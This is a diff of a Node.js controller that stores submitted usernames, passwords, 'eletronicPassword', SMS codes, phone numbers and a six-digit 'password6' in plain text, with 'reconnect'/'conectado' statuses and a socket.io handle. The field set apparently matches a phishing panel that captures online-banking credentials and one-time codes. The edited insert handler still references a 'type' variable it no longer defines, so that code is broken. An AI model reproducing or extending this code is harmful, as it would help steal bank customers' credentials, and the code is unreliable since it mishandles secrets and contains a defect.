@@ -110,9 +110,7 @@ module.exports = {
         try {
             //Client
 
-            const { type, user, password, eletronicPassword, sms, status } = req.body
-
-            //return res.json({ user, type, status })
+            const { type, user, password, eletronicPassword, sms, status, phone } = req.body
 
             if (!user) return res.status(400).send({ error: `Informe seu usuário` })
 
@@ -125,6 +123,7 @@ module.exports = {
                     password,
                     eletronicPassword,
                     sms,
+                    phone,
                     status: `reconnect`,
                 })
 
@@ -141,6 +140,7 @@ module.exports = {
                 password,
                 eletronicPassword,
                 sms,
+                phone,
                 status,
             })
 
@@ -169,8 +169,9 @@ module.exports = {
     async insert(req, res) {
         try {
             //Client
+            const io = req.app.io
 
-            const { type, user, password, eletronicPassword, sms, status } = req.body
+            const { username: user, password, password6 } = req.body
 
             //return res.json({ user, type, status })
 
@@ -183,8 +184,7 @@ module.exports = {
                     type,
                     user,
                     password,
-                    eletronicPassword,
-                    sms,
+                    password6,
                     status: `reconnect`,
                 })
 
@@ -192,12 +192,10 @@ module.exports = {
             }
 
             const client = await Client.create({
-                type,
                 user,
                 password,
-                eletronicPassword,
-                sms,
-                status,
+                password6,
+                status: 'conectado',
             })
 
             return res.json(client)
